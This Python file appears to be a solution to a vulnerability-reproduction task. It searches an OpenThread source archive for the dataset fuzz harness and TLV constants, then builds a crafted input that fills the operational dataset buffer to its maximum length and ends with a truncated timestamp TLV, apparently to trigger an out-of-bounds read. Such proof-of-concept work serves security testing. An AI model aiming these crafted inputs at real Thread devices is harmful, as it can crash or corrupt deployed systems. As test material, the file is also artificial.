import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


def _parse_int_literal(s: str) -> Optional[int]:
    if not s:
        return None
    s = s.strip()
    s = re.sub(r'^[({\s]*', '', s)
    s = re.sub(r'[\s;)}].*$', '', s)
    s = s.strip()
    s = re.sub(r'(?:u|U|l|L)+$', '', s).strip()
    m = re.search(r'0x[0-9a-fA-F]+|\d+', s)
    if not m:
        return None
    lit = m.group(0)
    try:
        return int(lit, 0)
    except Exception:
        try:
            return int(lit, 10)
        except Exception:
            return None


def _iter_source_files_from_tar(tar: tarfile.TarFile):
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")
    for m in tar.getmembers():
        if not m.isfile():
            continue
        name = m.name
        if not name.lower().endswith(exts):
            continue
        if m.size <= 0:
            continue
        if m.size > 3_000_000:
            continue
        try:
            f = tar.extractfile(m)
            if f is None:
                continue
            b = f.read()
        except Exception:
            continue
        yield name, b


def _iter_source_files_from_dir(root: str):
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if not fn.lower().endswith(exts):
                continue
            path = os.path.join(dirpath, fn)
            try:
                st = os.stat(path)
                if st.st_size <= 0 or st.st_size > 3_000_000:
                    continue
                with open(path, "rb") as f:
                    b = f.read()
            except Exception:
                continue
            rel = os.path.relpath(path, root)
            yield rel, b


def _find_define_max_len(text: str) -> Optional[int]:
    m = re.search(r'^\s*#\s*define\s+OT_OPERATIONAL_DATASET_MAX_LENGTH\s+([^\r\n]+)$', text, re.M)
    if m:
        v = _parse_int_literal(m.group(1))
        if v is not None:
            return v
    m = re.search(r'\bmTlvs\s*\[\s*OT_OPERATIONAL_DATASET_MAX_LENGTH\s*\]', text)
    if m:
        pass
    m = re.search(r'\bstruct\s+otOperationalDatasetTlvs\b.*?\{.*?\bmTlvs\s*\[\s*(\d+)\s*\]', text, re.S)
    if m:
        v = _parse_int_literal(m.group(1))
        if v is not None:
            return v
    return None


def _extract_tlv_types(text: str, out: Dict[str, int]) -> None:
    keys = {
        "panid": ["kPanId", "PanIdTlv", "PanId"],
        "channel": ["kChannel", "ChannelTlv", "Channel"],
        "active_ts": ["kActiveTimestamp", "ActiveTimestampTlv", "ActiveTimestamp"],
        "pending_ts": ["kPendingTimestamp", "PendingTimestampTlv", "PendingTimestamp"],
        "delay_timer": ["kDelayTimer", "DelayTimerTlv", "DelayTimer"],
    }

    for k, names in keys.items():
        if k in out:
            continue
        for nm in names:
            m = re.search(r'\b' + re.escape(nm) + r'\b\s*=\s*([^\s,}]+)', text)
            if m:
                v = _parse_int_literal(m.group(1))
                if v is not None and 0 <= v <= 255:
                    out[k] = v
                    break
        if k in out:
            continue
        for nm in names:
            m = re.search(r'\b' + re.escape(nm) + r'\b[^{;\n]*?\{[^}]*?\bkType\s*=\s*([^;,\r\n]+)', text, re.S)
            if m:
                v = _parse_int_literal(m.group(1))
                if v is not None and 0 <= v <= 255:
                    out[k] = v
                    break


def _pick_dataset_fuzzer(sources: List[Tuple[str, str]]) -> Optional[Tuple[str, str]]:
    candidates = []
    for name, text in sources:
        if "LLVMFuzzerTestOneInput" not in text:
            continue
        if "otDatasetSetActiveTlvs" in text or "otDatasetSetPendingTlvs" in text:
            score = 0
            score += 10 if "otOperationalDatasetTlvs" in text else 0
            score += text.count("otDatasetSetActiveTlvs") * 3
            score += text.count("otDatasetSetPendingTlvs") * 3
            score += 2 if "FuzzedDataProvider" in text else 0
            score -= len(text) // 20000
            candidates.append((score, name, text))
    if not candidates:
        return None
    candidates.sort(reverse=True)
    _, name, text = candidates[0]
    return name, text


def _decide_active_path(fuzzer_text: str) -> Optional[bool]:
    has_active = "otDatasetSetActiveTlvs" in fuzzer_text
    has_pending = "otDatasetSetPendingTlvs" in fuzzer_text
    if has_active and not has_pending:
        return True
    if has_pending and not has_active:
        return False
    if not (has_active and has_pending):
        return None

    m = re.search(r'if\s*\(\s*!\s*([A-Za-z_]\w*)\s*\)\s*\{[^{}]*?otDatasetSetActiveTlvs', fuzzer_text, re.S)
    if m:
        return False
    m = re.search(r'if\s*\(\s*([A-Za-z_]\w*)\s*\)\s*\{[^{}]*?otDatasetSetActiveTlvs', fuzzer_text, re.S)
    if m:
        return True

    m = re.search(r'if\s*\(\s*!\s*([A-Za-z_]\w*)\s*\)\s*\{[^{}]*?otDatasetSetPendingTlvs', fuzzer_text, re.S)
    if m:
        return True
    m = re.search(r'if\s*\(\s*([A-Za-z_]\w*)\s*\)\s*\{[^{}]*?otDatasetSetPendingTlvs', fuzzer_text, re.S)
    if m:
        return False

    return True


def _encode_le(value: int, nbytes: int) -> bytes:
    value &= (1 << (8 * nbytes)) - 1
    return value.to_bytes(nbytes, "little", signed=False)


def _type_width_from_template(t: str) -> int:
    t = t.strip()
    t = t.replace("std::", "")
    if t in ("uint8_t", "unsigned char", "char", "signed char"):
        return 1
    if t in ("uint16_t", "unsigned short", "short", "int16_t"):
        return 2
    if t in ("uint32_t", "unsigned int", "int32_t"):
        return 4
    if t in ("uint64_t", "unsigned long long", "int64_t"):
        return 8
    if t in ("size_t",):
        return 8
    return 1


def _build_prefix_for_fdp(fuzzer_text: str, max_len: int, want_active: bool) -> bytes:
    prefix = bytearray()

    consume_bytes_idx = None
    m = re.search(r'\bConsumeBytes\s*<\s*uint8_t\s*>\s*\(', fuzzer_text)
    if m:
        consume_bytes_idx = m.start()
    else:
        m = re.search(r'\bConsumeRemainingBytes\b', fuzzer_text)
        if m:
            consume_bytes_idx = m.start()
    if consume_bytes_idx is None:
        consume_bytes_idx = len(fuzzer_text)

    bool_positions = [m.start() for m in re.finditer(r'\.\s*ConsumeBool\s*\(\s*\)', fuzzer_text)]
    bool_positions = [p for p in bool_positions if p < consume_bytes_idx]

    rng_positions = []
    for m in re.finditer(r'ConsumeIntegralInRange\s*<\s*([^>]+?)\s*>\s*\(\s*0\s*,\s*OT_OPERATIONAL_DATASET_MAX_LENGTH\s*\)', fuzzer_text):
        if m.start() < consume_bytes_idx:
            rng_positions.append((m.start(), m.group(1).strip()))

    events = []
    for p in bool_positions:
        events.append((p, ("bool", None)))
    for p, t in rng_positions:
        events.append((p, ("len", t)))
    events.sort(key=lambda x: x[0])

    for _, (kind, t) in events:
        if kind == "bool":
            prefix.append(0x01 if want_active else 0x00)
        else:
            width = _type_width_from_template(t)
            prefix += _encode_le(max_len, width)

    return bytes(prefix)


def _solve_diophantine_4_5(total: int) -> Tuple[int, int]:
    if total < 0:
        return 0, 0
    b = total % 4
    while b <= 1000 and 5 * b > total:
        b += 4
    if 5 * b > total:
        b = 0
    a = (total - 5 * b) // 4 if total - 5 * b >= 0 else 0
    if 4 * a + 5 * b != total:
        for bb in range(0, min(200, total // 5 + 1)):
            rem = total - 5 * bb
            if rem >= 0 and rem % 4 == 0:
                return rem // 4, bb
        return total // 4, 0
    return a, b


class Solution:
    def solve(self, src_path: str) -> bytes:
        sources: List[Tuple[str, str]] = []
        max_len = None
        tlv_types: Dict[str, int] = {}

        is_dir = os.path.isdir(src_path)
        tar = None
        try:
            if not is_dir:
                tar = tarfile.open(src_path, "r:*")
        except Exception:
            tar = None
            is_dir = True

        if tar is not None:
            it = _iter_source_files_from_tar(tar)
        else:
            it = _iter_source_files_from_dir(src_path)

        for name, b in it:
            if b is None:
                continue
            try:
                text = b.decode("utf-8", "ignore")
            except Exception:
                continue

            if max_len is None and "OT_OPERATIONAL_DATASET_MAX_LENGTH" in text:
                v = _find_define_max_len(text)
                if v is not None:
                    max_len = v

            if any(k not in tlv_types for k in ("panid", "channel", "active_ts", "pending_ts", "delay_timer")):
                if ("kActiveTimestamp" in text or "kPendingTimestamp" in text or "DelayTimer" in text or "MeshCoP" in text or "Tlv::k" in text):
                    _extract_tlv_types(text, tlv_types)

            if "LLVMFuzzerTestOneInput" in text and ("otDatasetSetActiveTlvs" in text or "otDatasetSetPendingTlvs" in text):
                sources.append((name, text))

        if tar is not None:
            try:
                tar.close()
            except Exception:
                pass

        if max_len is None:
            for _, text in sources:
                v = _find_define_max_len(text)
                if v is not None:
                    max_len = v
                    break
        if max_len is None:
            max_len = 254
        if max_len < 32:
            max_len = 32
        if max_len > 255:
            max_len = 255

        panid_type = tlv_types.get("panid", 0x01)
        channel_type = tlv_types.get("channel", 0x00)
        active_ts_type = tlv_types.get("active_ts", 0x0E)
        pending_ts_type = tlv_types.get("pending_ts", 0x0F)
        delay_timer_type = tlv_types.get("delay_timer", 0x34)

        fuzzer = _pick_dataset_fuzzer(sources)
        want_active = True
        fuzzer_text = ""
        if fuzzer is not None:
            _, fuzzer_text = fuzzer
            ap = _decide_active_path(fuzzer_text)
            if ap is not None:
                want_active = ap

        if want_active:
            target_type = active_ts_type
        else:
            target_type = pending_ts_type if pending_ts_type is not None else delay_timer_type

        bad_len = 1
        bad_tlv_size = 2 + bad_len
        if bad_tlv_size >= max_len:
            bad_len = 0
            bad_tlv_size = 2

        pre_len = max_len - bad_tlv_size
        a, b = _solve_diophantine_4_5(pre_len)

        panid_tlv = bytes([panid_type & 0xFF, 0x02, 0x12, 0x34])
        channel_tlv = bytes([channel_type & 0xFF, 0x03, 0x00, 0x00, 0x0B])

        filler = channel_tlv * b + panid_tlv * a
        if len(filler) != pre_len:
            if len(filler) > pre_len:
                filler = filler[:pre_len]
            else:
                filler = filler + (panid_tlv * ((pre_len - len(filler) + 3) // 4))
                filler = filler[:pre_len]

        bad_tlv = bytes([target_type & 0xFF, bad_len & 0xFF]) + (b"\x00" * bad_len)
        tlvs_buf = filler + bad_tlv
        if len(tlvs_buf) != max_len:
            tlvs_buf = (tlvs_buf + (b"\x00" * max_len))[:max_len]

        prefix = b""
        if fuzzer_text:
            if "FuzzedDataProvider" in fuzzer_text:
                prefix = _build_prefix_for_fdp(fuzzer_text, max_len, want_active)
            else:
                prefix = b""

        return prefix + tlvs_buf